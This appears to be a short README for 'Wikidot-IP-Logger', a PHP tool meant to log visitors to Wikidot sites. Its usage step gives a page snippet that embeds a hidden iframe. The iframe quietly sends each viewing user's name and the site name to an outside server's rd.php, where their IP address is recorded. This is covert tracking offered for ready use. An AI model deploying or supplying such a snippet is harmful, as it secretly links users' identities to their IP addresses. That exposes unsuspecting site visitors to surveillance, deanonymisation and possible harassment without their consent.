# Wikidot-IP-Logger
A simple IP logging tool for Wikidot sites, developed using PHP.

Usage
Deploy all the code files into a single directory on your server.
Then, add the following snippet to any page:
```html
[[module ListUsers users="."]][[iframe http://example.com/rd.php?user=%%title%%&site=sitename style=“display:none;”]][[/module]]

**Note:** Replace `sitename` with the name of your site.
